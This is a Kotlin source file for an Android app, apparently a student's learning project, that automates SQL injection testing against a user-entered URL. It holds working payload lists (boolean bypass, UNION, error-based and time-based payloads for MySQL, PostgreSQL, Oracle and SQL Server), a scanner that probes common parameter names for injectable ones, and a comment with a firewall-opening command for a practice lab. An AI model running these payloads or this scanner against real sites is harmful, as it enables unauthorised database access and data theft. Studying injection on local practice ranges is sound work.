package com.example.myapplication

/*
各位大佬轻点喷,本人只是个普通学生,能力很差,希望包容一些QAQ
本来想页面尽量恶搞一下的,但是感觉不太好(感觉要是有人分享我写的,结果自己到处写胡话会不会太尴尬了啊......),所有就显得比较严肃?

本程序就不是个合格的渗透工具...仅仅作用学习使用,测试的也是很基础的例子,我再学五年也写不出sqlmap这样的真神级工具qaq,谢谢理解啦!!

如果您要测试本软件,建议使用sql labs这个本地靶场,开启设备都允许访问靶场(可能需要关闭防火墙),例如如果是wamp的话,就要在wamp bin apach apach版本号 conf httpd.conf中更改访问规则(Directory标签下写Require all granted)
然后终端管理员输入
netsh advfirewall firewall add rule name="Apache HTTP" dir=in action=allow program="D:\wamp\bin\apache\apache2.4.9\bin\httpd.exe" enable=yes  (这个是关闭wamp的防火墙,具体地址看自己实际情况,我这里只是例子)
 */


import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.view.Window
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import okhttp3.*
import java.io.IOException
import kotlin.concurrent.thread


class MainActivity : AppCompatActivity() {


    private var lastHtmlResponse = ""

    private lateinit var tvResult: TextView
    private val client = OkHttpClient()

    private var lastDetectionTime = 0L
    //自动检测,防止频繁请求的!!!可以自己改世界
    private val detectionCooldown = 5000  // 5秒冷却时间


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 隐藏标题栏的,确保手机一样qaq之前没写出现了点奇怪的bug..?
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE)

        setContentView(R.layout.activity_main)

        //这个是侧滑栏,对不起QAQ不想写复杂了,就杂糅在一起了
        val drawerLayout = findViewById<DrawerLayout>(R.id.drawer_layout)
        findViewById<ImageButton>(R.id.btn_menu).setOnClickListener {
            drawerLayout.openDrawer(GravityCompat.START)
        }

        tvResult = findViewById(R.id.tvResult)


        val sharedPref = getSharedPreferences("app_prefs", Context.MODE_PRIVATE) //创建一个名字叫做app_prefs的文件来存储数据
        val isFirstTime = sharedPref.getBoolean("is_first_time", true)  //从SharedPreferences中读取一个布尔值,没有就返回为true值,就是表示第一次访问啦...

        if (isFirstTime) {
            sharedPref.edit().putBoolean("is_first_time", false).apply()//标记访问过一次了
            startActivity(Intent(this, showlntroduction::class.java))  //想看介绍逻辑麻烦点showlntroduction这个文件
        } else {
            // 正常初始化UI组件
            setupUI()

            tvResult.setOnLongClickListener {
                if (lastHtmlResponse.isNotEmpty()) {
                    // 启动新页面显示完整HTML响应
                    startActivity(ResponseRenderActivity.newIntent(this, lastHtmlResponse))
                } else {
                    Toast.makeText(this, "请先执行注入测试", Toast.LENGTH_SHORT).show()
                }
                true // 消耗事件
            }
        }
    }


    private fun setupUI() {
        // 模式选择单选按钮组
        val radioModeGroup = findViewById<RadioGroup>(R.id.radioModeGroup)
        // 攻击类型单选按钮组
        val radioAttackTypeGroup = findViewById<RadioGroup>(R.id.radioAttackTypeGroup)
        // Payload输入框
        val etPayload = findViewById<EditText>(R.id.etPayload)
        // 化注入按钮
        val btnInject = findViewById<Button>(R.id.btnInject)

        // 初始状态设置（默认自动模式）
        radioModeGroup.check(R.id.radioAuto)
        radioAttackTypeGroup.visibility = View.VISIBLE
        etPayload.isEnabled = false
        etPayload.setText("当前为自动模式无需填写")
        etPayload.setTextColor(Color.parseColor("#848d97")) // 这个设置灰色提示文字,可以自己改颜色

        // 监听模式切换
        radioModeGroup.setOnCheckedChangeListener { _, checkedId ->
            when (checkedId) {
                R.id.radioAuto -> {
                    // 自动模式：禁用Payload输入，显示攻击类型选项
                    etPayload.isEnabled = false
                    etPayload.setText("自动模式下无需填写")
                    etPayload.setTextColor(Color.parseColor("#848d97"))
                    radioAttackTypeGroup.visibility = View.VISIBLE
                }
                R.id.radioManual -> {
                    // 手动模式：启用Payload输入，隐藏攻击类型选项
                    etPayload.isEnabled = true
                    etPayload.setText("")
                    etPayload.setTextColor(Color.parseColor("#e6edf3")) // 恢复普通文本颜色
                    radioAttackTypeGroup.visibility = View.GONE
                }
            }
        }

        // 注入按钮点击事件
        btnInject.setOnClickListener {
            val url = findViewById<EditText>(R.id.etTargetUrl).text.toString()
            val parameter = findViewById<EditText>(R.id.etParameter).text.toString()

            if (radioModeGroup.checkedRadioButtonId == R.id.radioAuto) {
                // 自动模式：根据选择的攻击类型生成Payload
                val attackType = when (radioAttackTypeGroup.checkedRadioButtonId) {
                    R.id.radioErrorBased -> "ERROR-BASED"  // 基于错误的注入
                    R.id.radioTimeBased -> "TIME-BASED"    // 时间盲注
                    R.id.radioUnion -> "UNION"             // 联合查询注入
                    else -> {
                        toast("请选择攻击类型")
                        return@setOnClickListener
                    }
                }

                val autoPayload = generateSmartPayload(attackType, url)
                startInjection(url, parameter, autoPayload)

            } else {
                // 手动模式：使用用户输入的Payload
                val payload = etPayload.text.toString()
                if (payload.isEmpty()) {
                    toast("请输入自定义Payload")
                    return@setOnClickListener
                }
                startInjection(url, parameter, payload)
            }
        }

        // 参数探测按钮事件
        findViewById<Button>(R.id.btnDetect).setOnClickListener {
            val currentTime = System.currentTimeMillis()
            // 检查是否在冷却时间内
            if (currentTime - lastDetectionTime < detectionCooldown) {
                toast("请稍后再试，操作过于频繁")
                return@setOnClickListener
            }
            // 更新最后检测时间
            lastDetectionTime = currentTime

            val url = findViewById<EditText>(R.id.etTargetUrl).text.toString()
            if (url.isEmpty()) {
                toast("请输入目标URL")
                return@setOnClickListener
            }

            // 开始探测易受攻击的参数
            detectVulnerableParameter(url)
        }
    }

    /**
    执行SQL注入测试请求
     * @param url 目标URL
     * @param parameter 要测试的参数名
     *@param payload 注入的payload
     */
    private fun startInjection(url: String, parameter: String, payload: String) {
        // 更新结果视图显示加载状态
        tvResult.text = "正在发送注入请求...\nURL: $url\n参数: $parameter\nPayload: $payload"

        // 构建完整的测试URL
        val fullUrl = if (url.contains("?")) {
            "$url&$parameter=${payload.encodeURL()}"
        } else {
            "$url?$parameter=${payload.encodeURL()}"
        }

        // 构建HTTP请求
        val request = Request.Builder()
            .url(fullUrl)
            .header("User-Agent", "Mozilla/5.0") // 添加浏览器UA头
            .build()

        // 记录请求开始时间（用于时间盲注）
        val startTime = System.currentTimeMillis()

        // 异步发送请求
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                // 网络请求失败处理
                runOnUiThread {
                    tvResult.text = "请求失败: ${e.message}\n尝试的URL: $fullUrl"
                }
            }

            override fun onResponse(call: Call, response: Response) {
                // 获取响应内容
                val body = response.body?.string() ?: ""
                val responseTime = System.currentTimeMillis() - startTime

                lastHtmlResponse = body

                runOnUiThread {
                    // 格式化显示检测结果
                    tvResult.text = """
                        ========================
                        URL: ${url}
                        参数: ${parameter}
                        Payload: ${payload}
                        ========================
                        状态码: ${response.code}
                        响应时间: ${responseTime}ms
                        响应大小: ${body.length} 字符
                        ========================
                        响应内容:
                        ${body.take(500)}${if (body.length > 500) "..." else ""}
                    """.trimIndent()

                    // 添加针对特定注入类型的提示
                    when {
                        payload.contains("SLEEP", ignoreCase = true) ||
                                payload.contains("WAITFOR", ignoreCase = true) -> {
                            if (responseTime > 5000) {
                                tvResult.append("\n\n⚠️ 检测到时间延迟，可能存在时间盲注漏洞")
                            } else {
                                tvResult.append("\n\n⏱ 未检测到明显时间延迟，请检查Payload是否正确")
                            }
                        }
                        payload.contains("EXTRACTVALUE", ignoreCase = true) ||
                                payload.contains("UPDATEXML", ignoreCase = true) -> {
                            if (body.contains("XPATH syntax error", ignoreCase = true)) {
                                tvResult.append("\n\n❗ 检测到数据库错误信息，可能存在基于错误的注入漏洞")
                            }
                        }
                    }
                }
            }
        })
    }


    private fun toast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    //根据攻击类型生成对应的Payload

    private fun generateAutoPayload(attackType: String): String {
        return when (attackType) {
            "ERROR-BASED" -> "' AND EXTRACTVALUE(1, CONCAT(0x5c, VERSION())) -- "  // 基于错误的注入Payload
            "TIME-BASED" -> "' AND if(1=1, SLEEP(5), 0) OR 'a'='a"  // 时间盲注Payload
            "UNION" -> "' UNION SELECT NULL, NULL, NULL -- "  // 联合查询注入
            else -> ""
        }
    }
    /**
     * 字符串URL编码扩展函数
     */
    private fun String.encodeURL(): String {
        return java.net.URLEncoder.encode(this, "UTF-8")
    }


    //探测易受攻击的参数

    private fun detectVulnerableParameter(url: String) {
        tvResult.text = "正在扫描易受攻击参数..."


        val params = listOf(
            "id", "name", "user", "account", "email",
            "search", "query", "category", "product", "order"
        )

        // 通用Payload库
        val payloads = listOf(
            // 基础注入
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "' OR ''='",
            "' OR 1=1#",

            // 联合查询
            "' UNION SELECT null,null -- ",
            "' UNION SELECT 1,version() -- ",

            // 报错注入
            "' AND extractvalue(1,concat(0x7e,version())) -- ",

            // 时间盲注
            "' AND (SELECT sleep(3)) -- "
        )

        val progress = findViewById<ProgressBar>(R.id.progressBar).apply {
            max = params.size * payloads.size
            progress = 0
            visibility = View.VISIBLE
        }

        thread {
            val detectedParams = mutableListOf<String>()
            val originalContent = getNormalResponse(url) // 获取正常响应

            paramLoop@ for (param in params) {
                for (payload in payloads) {
                    try {
                        val testUrl = buildTestUrl(url, param, payload)
                        if (isVulnerable(testUrl, originalContent)) {
                            detectedParams.add(param)
                            continue@paramLoop
                        }
                        runOnUiThread { progress.incrementProgressBy(1) }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }

            runOnUiThread {
                progress.visibility = View.GONE
                showDetectionResult(detectedParams)
            }
        }
    }


    private fun getNormalResponse(url: String): String {
        val safeParam = "safe=1" // 无害参数
        val testUrl = if (url.contains("?")) "$url&$safeParam" else "$url?$safeParam"
        return client.newCall(Request.Builder().url(testUrl).build())
            .execute().use { it.body?.string() ?: "" }
    }


    private fun isVulnerable(testUrl: String, originalContent: String): Boolean {
        val request = Request.Builder()
            .url(testUrl)
            .header("User-Agent", "Mozilla/5.0")
            .build()

        val startTime = System.currentTimeMillis()
        val response = client.newCall(request).execute()

        return response.use {
            val responseTime = System.currentTimeMillis() - startTime
            val body = it.body?.string() ?: ""

            // 检测规则1：响应内容差异
            if (body != originalContent) {
                return@use true
            }

            // 检测规则2：数据库错误
            val errorKeywords = listOf(
                "SQL syntax", "mysql", "ora-", "syntax error",
                "unclosed quotation", "XPATH syntax", "Warning: mysql"
            )
            if (errorKeywords.any { body.contains(it, true) }) {
                return@use true
            }

            // 检测规则3：时间延迟
            if (responseTime > 3000) {
                return@use true
            }

            false
        }
    }


    private fun showDetectionResult(detectedParams: List<String>) {
        val resultText = if (detectedParams.isNotEmpty()) {
            // 自动填充第一个参数
            findViewById<EditText>(R.id.etParameter).setText(detectedParams.first())
            """
            扫描完成
            ================
            发现可注入参数：
            ${detectedParams.joinToString("\n")}
            ================
            已自动选择首个参数
            """.trimIndent()
        } else {
            """
            扫描完成
            ================
            未发现明显漏洞
            ================
            建议手动测试：
            1. ' OR 1=1 -- 
            2. " OR 1=1 -- 
            """.trimIndent()
        }
        tvResult.text = resultText
    }

    /**
     * 构建测试URL
     * @param baseUrl 基础URL
     * @param param 要测试的参数名
     * @param payload 注入的payload
     * @return 完整的测试URL
     */
    private fun buildTestUrl(baseUrl: String, param: String, payload: String): String {
        val separator = if (baseUrl.contains("?")) "&" else "?"
        return "$baseUrl${separator}${param}=${payload.encodeURL()}"
    }

    /**
     * 测试URL是否存在SQL注入漏洞
     * @param url 要测试的URL
     * @return 测试结果对象
     */
    private fun testVulnerability(url: String): VulnerabilityTestResult {
        val request = Request.Builder()
            .url(url)
            .header("User-Agent", "Mozilla/5.0")
            .build()

        val startTime = System.currentTimeMillis()

        // 执行请求并记录响应特征
        val response = client.newCall(request).execute().use { response ->
            val responseTime = System.currentTimeMillis() - startTime
            val responseBody = response.body?.string() ?: ""
            val statusCode = response.code

            // 构造测试结果对象
            VulnerabilityTestResult(
                isVulnerable = isResponseVulnerable(responseBody, responseTime),
                statusCode = statusCode,
                responseTime = responseTime,
                responseLength = responseBody.length
            )
        }

        return response
    }

    /**
     * @param response 响应体内容
     * @param responseTime 响应时间(ms)
     */
    private fun isResponseVulnerable(response: String, responseTime: Long): Boolean {
        // 规则1: 检测常见数据库错误关键词
        val errorKeywords = listOf(
            "SQL syntax", "mysql", "postgresql", "ora-", "microsoft ole db",
            "syntax error", "unclosed quotation mark", "statement not complete",
            "XPATH syntax error", "CONVERT", "CAST"  // 基于错误注入的关键词
        )

        if (errorKeywords.any { keyword -> response.contains(keyword, ignoreCase = true) }) {
            return true  // 发现错误信息
        }

        // 规则2: 异常长响应时间（超过5秒）
        if (responseTime > 5000) {
            return true  // 可能存在时间盲注
        }

        // 规则3: 响应内容包含登录成功信息
        val successPatterns = listOf(
            "welcome, admin", "logged in as", "administrator", "login successful"
        )

        if (successPatterns.any { pattern -> response.contains(pattern, ignoreCase = true) }) {
            return true  // 注入成功获取管理员权限
        }

        return false
    }

    /**
     * 智能生成SQL注入Payload
     * @param attackType 攻击类型
     * @param baseUrl 目标URL (用于智能分析)
     */
    private fun generateSmartPayload(attackType: String, baseUrl: String = ""): String {
        return when (attackType) {
            "UNION" -> {
                when {
                    // 自适应不同类型注入
                    baseUrl.contains("?id=") -> "-1' UNION SELECT 1,version(),3-- " // 数字型注入
                    else -> "' UNION SELECT NULL,database(),user() -- " // 通用字符型注入
                }
            }

            "ERROR-BASED" -> generateErrorBasedPayload()

            "TIME-BASED" -> generateTimeBasedPayload()

            else -> generateAutoPayload(attackType)
        }
    }

    /**
     * 生成自适应列数的联合注入Payload
     */
    private fun generateAdaptiveUnionPayload(): String {
        // 尝试常见列数配置 (1-6列)
        return listOf(
            "' UNION SELECT 1 -- ",
            "' UNION SELECT 1,2 -- ",
            "' UNION SELECT 1,2,3 -- ",
            "' UNION SELECT 1,2,3,4 -- ",
            "' UNION SELECT 1,2,3,4,5 -- ",
            "' UNION SELECT 1,2,3,4,5,6 -- "
        ).joinToString(";") // 使用分号分隔多个Payload尝试
    }


     // 生成基于错误的注入Payload

    private fun generateErrorBasedPayload(): String {
        return listOf(
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
            "' AND GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1) -- ",
            "' AND EXP(~(SELECT * FROM(SELECT VERSION())a)) -- ",
            "' AND (SELECT 1 FROM(SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1))a) -- "

        ).random() // 随机选择一个数据库特定的Payload
    }


     //生成通用时间盲注Payload

    private fun generateTimeBasedPayload(): String {
        return listOf(
            "' AND IF(1=1,SLEEP(5),0) -- ",       // MySQL/SQLite
            "' AND (SELECT * FROM (SELECT pg_sleep(5))a) -- ", // PostgreSQL
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)='a",     // Oracle
            "' WAITFOR DELAY '0:0:5' -- "          // SQL Server
        ).random() // 随机选择一个数据库特定的Payload
    }



    private fun getVersionFunction(): String {
        return listOf(
            "version()",      // MySQL/PostgreSQL/SQLite
            "@@version",      // MySQL/SQL Server
            "banner FROM v\$version", // Oracle
            "sqlite_version()"// SQLite
        ).random() // 随机选择版本函数
    }

    private fun tryPayloadsSequentially(
        url: String,
        parameter: String,
        payloads: List<String>,
        index: Int = 0
    ) {
        if (index >= payloads.size) {
            runOnUiThread {
                tvResult.text = "所有Payload尝试失败\n请尝试手动模式"
            }
            return
        }

        val payload = payloads[index]
        val fullUrl = if (url.contains("?")) {
            "$url&$parameter=${payload.encodeURL()}"
        } else {
            "$url?$parameter=${payload.encodeURL()}"
        }

        runOnUiThread {
            tvResult.text = "尝试Payload (${index+1}/${payloads.size}): $payload"
        }

        val request = Request.Builder()
            .url(fullUrl)
            .header("User-Agent", "Mozilla/5.0")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                tryPayloadsSequentially(url, parameter, payloads, index + 1)
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                lastHtmlResponse = body

                if (body.contains("Welcome", ignoreCase = true) ||
                    body.contains("Dhakkan", ignoreCase = true)) {
                    runOnUiThread {
                        tvResult.text = """
                    ========================
                    成功Payload: $payload
                    ========================
                    响应内容:
                    ${body.take(500)}${if (body.length > 500) "..." else ""}
                    """.trimIndent()
                    }
                } else {
                    tryPayloadsSequentially(url, parameter, payloads, index + 1)
                }
            }
        })
    }

    fun onGithubClick(view: View) {
      //  val uri = Uri.parse("")
       // startActivity(Intent(Intent.ACTION_VIEW, uri))
        toast("第一版请加群获取地址~")
    }


    /*
     isVulnerable 是否存在漏洞
     statusCode HTTP状态码
     responseTime 响应时间
     responseLength 响应体长度
     */
    data class VulnerabilityTestResult(
        val isVulnerable: Boolean,
        val statusCode: Int,
        val responseTime: Long,
        val responseLength: Int
    )

}

